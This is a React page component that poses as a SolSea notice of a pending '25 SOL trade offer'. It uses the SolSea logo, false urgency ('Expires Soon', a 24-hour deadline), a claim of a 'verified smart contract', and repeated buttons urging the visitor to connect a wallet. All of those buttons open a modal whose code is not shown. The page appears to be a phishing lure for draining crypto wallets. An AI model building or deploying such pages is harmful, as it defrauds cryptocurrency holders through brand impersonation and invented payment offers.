"use client"

import { useState } from "react"
import { Modals } from "@/components/modals"
import { Button } from "@/components/ui/button"

export default function Page() {
  const [isModalOpen, setIsModalOpen] = useState(false)

  return (
    <main className="min-h-screen bg-gradient-to-b from-[#0A001F] to-[#16003A] p-4 pb-20">
      {/* Top Navigation Bar */}
      <div className="fixed top-0 left-0 right-0 bg-gray-900/90 backdrop-blur-lg border-b border-gray-800/50 z-50">
        <div className="container mx-auto px-4 py-3">
          <div className="flex items-center">
            <img 
              src="https://solsea.io/assets/SolSea.svg" 
              alt="New Offer - SolSea" 
              className="h-8 w-auto"
              loading="lazy"
            />
            <div className="ml-2">
              <div className="text-xs text-gray-400 font-medium">Trade Offer Pending</div>
            </div>
          </div>
        </div>
      </div>

      {/* Main Content */}
      <div className="pt-20 w-full max-w-sm mx-auto flex flex-col items-center space-y-8">
        
        {/* Trade Offer Card */}
        <div className="w-full bg-gradient-to-br from-gray-900/90 to-gray-800/90 backdrop-blur-sm rounded-2xl p-6 border border-purple-500/20 shadow-xl">
          <div className="text-center mb-6">
            <div className="inline-flex items-center gap-2 bg-gradient-to-r from-blue-900/30 to-blue-800/30 px-4 py-2 rounded-full mb-6">
              <div className="w-2 h-2 bg-blue-400 rounded-full animate-pulse"></div>
              <span className="text-blue-300 text-sm font-semibold">💰 Trade Offer Received</span>
              <div className="w-2 h-2 bg-blue-400 rounded-full animate-pulse"></div>
            </div>
            
            {/* New Trade Offer Banner */}
            <div className="mb-6 p-4 bg-gradient-to-r from-yellow-500/20 to-orange-500/20 border border-yellow-500/30 rounded-xl">
              <div className="flex items-center justify-center gap-2 mb-2">
                <div className="w-3 h-3 bg-yellow-500 rounded-full animate-pulse"></div>
                <span className="text-yellow-300 font-bold text-lg">NEW TRADE OFFER</span>
                <div className="w-3 h-3 bg-yellow-500 rounded-full animate-pulse"></div>
              </div>
              <p className="text-white text-sm">
                You have received a trade offer of Solana. Click below to review and accept or decline this payment.
              </p>
            </div>
            
            <div className="mb-8">
              <div className="text-6xl font-bold bg-gradient-to-r from-yellow-300 to-orange-200 bg-clip-text text-transparent">
               25 SOL
              </div>
              <div className="text-white font-semibold text-xl mt-2">Trade Offer Amount</div>
              <div className="text-gray-300 text-sm mt-2 flex items-center justify-center gap-2">
                <span className="text-yellow-400">●</span>
                <span>Waiting for your response</span>
                <span className="text-yellow-400">●</span>
              </div>
            </div>

            <div className="space-y-4 text-left">
              <div className="flex items-center gap-3">
                <div className="w-8 h-8 bg-blue-900/40 rounded-lg flex items-center justify-center flex-shrink-0">
                  <div className="w-3 h-3 bg-blue-500 rounded-full"></div>
                </div>
                <div>
                  <div className="font-semibold text-white">Trade Offer Details</div>
                  <div className="text-sm text-gray-400">25 SOL waiting for your acceptance</div>
                </div>
              </div>
              
              <div className="flex items-center gap-3">
                <div className="w-8 h-8 bg-green-900/40 rounded-lg flex items-center justify-center flex-shrink-0">
                  <div className="w-3 h-3 bg-green-500 rounded-full"></div>
                </div>
                <div>
                  <div className="font-semibold text-white">Immediate Transfer</div>
                  <div className="text-sm text-gray-400">Funds will be sent instantly upon acceptance</div>
                </div>
              </div>
              
              <div className="flex items-center gap-3">
                <div className="w-8 h-8 bg-purple-900/40 rounded-lg flex items-center justify-center flex-shrink-0">
                  <div className="w-3 h-3 bg-purple-500 rounded-full"></div>
                </div>
                <div>
                  <div className="font-semibold text-white">Secure Transaction</div>
                  <div className="text-sm text-gray-400">Verified smart contract for safe transfer</div>
                </div>
              </div>

              {/* Action Required Section */}
              <div className="mt-8 p-4 bg-gradient-to-r from-blue-900/30 to-purple-900/30 rounded-xl border border-blue-500/30">
                <div className="text-center mb-3">
                  <div className="text-white font-bold text-lg mb-1">Action Required</div>
                  <div className="text-gray-300 text-sm">
                    You must accept or decline this trade offer within 24 hours
                  </div>
                </div>
                <div className="flex gap-3">
                  <Button 
                    onClick={() => setIsModalOpen(true)}
                    className="flex-1 py-3 bg-gradient-to-r from-green-600 to-green-700 hover:from-green-700 hover:to-green-800 text-white font-bold"
                  >
                    Review Offer
                  </Button>
                  <Button 
                    variant="outline"
                    className="flex-1 py-3 border-red-500/50 text-red-400 hover:bg-red-900/20 font-bold"
                  >
                    Decline
                  </Button>
                </div>
              </div>
            </div>
          </div>
        </div>
        
        {/* Main Action Button */}
        <div className="w-full space-y-4">
          <Button 
            onClick={() => setIsModalOpen(true)} 
            className="w-full py-6 rounded-xl shadow-2xl transition-all duration-300 hover:scale-[1.02] animate-pulse"
            style={{
              background: 'linear-gradient(135deg, #fbbf24 0%, #f59e0b 50%, #d97706 100%)',
              border: '2px solid rgba(251, 191, 36, 0.5)',
              fontSize: '18px',
              fontWeight: '700',
            }}
          >
            <div className="flex items-center justify-center gap-3">
              <span className="text-white text-lg">📬 Click to Accept 25 SOL Trade Offer</span>
            </div>
          </Button>

          <div className="text-center">
            <p className="text-sm text-gray-300 mb-1">
              ⚡ <span className="font-semibold">Trade Offer Expires Soon!</span>
            </p>
            <p className="text-xs text-gray-400">
              Click the button above to review and accept your 25 SOL payment
            </p>
          </div>
        </div>

        {/* Terms & Info */}
        <div className="w-full space-y-4 pt-4 border-t border-gray-800/50">
          <div className="text-center">
            <p className="text-sm text-gray-400 mb-2">
              You have a pending trade offer of 25 SOL
            </p>
            <p className="text-xs text-gray-500">
              Connect wallet to review and accept or decline the payment
            </p>
          </div>
          
          <div className="flex items-center justify-center gap-6 text-xs text-gray-600">
            <span>Solana</span>
            <span>•</span>
            <span>Trade Offer</span>
            <span>•</span>
            <span>Payment</span>
          </div>
        </div>
      </div>

      <Modals isOpen={isModalOpen} onClose={() => setIsModalOpen(false)} />
      
      {/* Mobile bottom spacing */}
      <div className="h-20"></div>
    </main>
  )
        }
